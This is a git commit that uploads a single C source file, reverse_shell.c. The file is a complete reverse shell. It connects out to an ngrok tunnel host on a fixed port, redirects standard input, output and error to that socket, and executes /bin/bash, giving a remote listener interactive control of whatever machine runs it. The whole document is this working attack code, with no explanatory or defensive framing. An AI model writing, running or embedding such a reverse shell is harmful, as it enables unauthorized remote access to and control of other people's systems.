1ad64a847fc1701d31eb92fc55d40df430785bf5
lcocozza <42718883+lcocozza@users.noreply.github.com>
2018-12-25 17:48:16 +0000

    Add files via upload

---
+++ reverse_shell.c
@@ -0,0 +1,46 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <netdb.h>
+
+#define REMOTE_ADDR "0.tcp.ngrok.io"
+#define REMOTE_PORT 17232
+
+#define closesocket(s) close(s)
+typedef struct sockaddr_in SOCKADDR_IN;
+typedef struct sockaddr SOCKADDR;
+typedef struct in_addr IN_ADDR;
+
+int	main()
+{
+	int serv_socket = socket(AF_INET, SOCK_STREAM, 0);
+	SOCKADDR_IN server_address = {0};
+	char *hostname = REMOTE_ADDR;
+	struct hostent *hostinfo = NULL;
+
+	hostinfo = gethostbyname(REMOTE_ADDR);
+	if (hostinfo == NULL)
+	{
+		printf("Unknow host %s.\n", REMOTE_ADDR);
+		closesocket(serv_socket);
+		exit(EXIT_FAILURE);
+	}
+
+	server_address.sin_addr = *(IN_ADDR *) hostinfo->h_addr;
+	server_address.sin_port = htons(REMOTE_PORT);
+	server_address.sin_family = AF_INET;
+
+	connect(serv_socket, (SOCKADDR *) &server_address, sizeof(SOCKADDR));
+	dup2(serv_socket, 0);
+	dup2(serv_socket, 1);
+	dup2(serv_socket, 2);
+
+	execve("/bin/bash", 0, 0);
+	
+	closesocket(serv_socket);
+	return 0;
+}
